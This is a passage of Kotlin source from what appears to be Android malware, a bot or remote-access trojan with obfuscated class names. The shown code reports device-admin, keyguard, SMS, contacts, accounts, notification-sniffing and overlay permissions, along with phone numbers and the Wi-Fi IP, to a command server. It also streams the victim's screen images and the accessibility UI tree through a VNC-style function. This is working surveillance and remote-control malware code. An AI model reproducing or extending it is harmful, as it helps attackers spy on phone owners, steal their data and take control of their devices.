                bot.put("admin", ActivityAdminqw.isAdminDevice(SharedPreferencess.getAppContext()!!).toString())
                bot.put("screen", Utilslp.isScreenOn(SharedPreferencess.getAppContext()!!).toString())
                bot.put("isKeyguardLocked", Utilslp.isKeyguardLocked(SharedPreferencess.getAppContext()!!).toString())
                bot.put("isDozeMode", PermissionsActivity.is_dozemode(SharedPreferencess.getAppContext()!!).toString())
                bot.put("all_permission", SharedPreferencess.hasAllPermition.toString())
                bot.put(
                    "contacts_permission",
                    Utilslp.hasPermission(SharedPreferencess.getAppContext()!!, "android.permission.READ_CONTACTS").toString()
                )
                bot.put(
                    "accounts_permission",
                    Utilslp.hasPermission(SharedPreferencess.getAppContext()!!, "android.permission.GET_ACCOUNTS").toString()
                )
                bot.put("notification_permission", DrawerSniffer.hasPermission(SharedPreferencess.getAppContext()!!).toString())
                bot.put(
                    "sms_permission",
                    (Utilslp.getStatSMS(SharedPreferencess.getAppContext()!!)
                            && Utilslp.hasPermission(SharedPreferencess.getAppContext()!!, "android.permission.SEND_SMS")
                            && Utilslp.hasPermission(SharedPreferencess.getAppContext()!!, "android.permission.READ_SMS")
                            && Utilslp.hasPermission(SharedPreferencess.getAppContext()!!, "android.permission.RECEIVE_SMS")
                            ).toString()
                )
                bot.put(
                    "overlay_permission",
                    PermissionsActivity.hasOverlayPerm(SharedPreferencess.getAppContext()!!).toString()
                )

                instance.params?.updateNumber(SharedPreferencess.getAppContext()!!)
                bot.put("isDualSim", Utilslp.isDualSim(SharedPreferencess.getAppContext()!!).toString())
                bot.put("operator", instance.params?.operator)
                bot.put("phone_number", instance.params?.phone)
                bot.put("operator1", instance.params?.operator1)
                bot.put("phone_number1", instance.params?.phone1)

                bot.put("step", SharedPreferencess.step.toString())

                runCatching {
                    bot.put("wifiIpAddress", UtilsGfgsd.wifiIpAddress(SharedPreferencess.getAppContext()!!))
                }.onFailure {
                    sendLogs("", "updateJson wifiIpAddress ${it.localizedMessage}", "error")
                }
            }.onFailure {
                sendLogs("", "updateJson ${it.localizedMessage}", "error")
            }
        }

        fun sendLogs(application: String, logs: String, type: String) = ApplicationScope.launch {
            runCatching {
                if (logs.isBlank())
                    return@launch
                if (BuildConfig.DEBUG)
                    Log.i(TAG, "\n\nsendLogs $logs\n\n")

                val params = CommonParamsvc(SharedPreferencess.getAppContext()!!)

                val data = JSONObject()
                data.put("uid", params.uid)
                data.put("application", application)
                data.put("type", type)
                data.put("logs", Gsonq().toJson(logs))
                data.put("command", "logs")
                apiRequestHttpNm.command(data)
            }
        }

        fun sendNewVnc(vnc_image: ByteArray? = null) {
            if (vnc_image == null) {
                if (jobVncTree == null || !jobVncTree!!.isActive) {
                    if (AccessibilityServiceQ.isEnabled) {
                        jobVncTree = ApplicationScope.launch(Dispatchers.Default) {
                            Log.i(TAG, "Start Send tree")
                            val str = apiRequestHttpNm.vnc(null, Globalqa.gson.toJson(AccessibilityServiceQ.instance?.rootUiObject?.uiTree()))
                            Log.i(TAG, "Finish Send tree $str")
                        }
                    }
                }
            } else {
                if (jobVncImage == null || !jobVncImage!!.isActive) {
                    jobVncImage = ApplicationScope.launch(Dispatchers.Default) {
                        Log.i(TAG, "Start Send image")
                        val str = apiRequestHttpNm.vnc(Base64.encodeToString(vnc_image, Base64.DEFAULT), null)
                        Log.i(TAG, "Finish Send image $str")
                    }
                }
            }
        }

        private val TAG = IOSocketyt::class.java.canonicalName

        val instance = IOSocketyt()

        val opts = IOQ.Options().apply {
            reconnection = false
            timeout = 30_000
        }
    }

}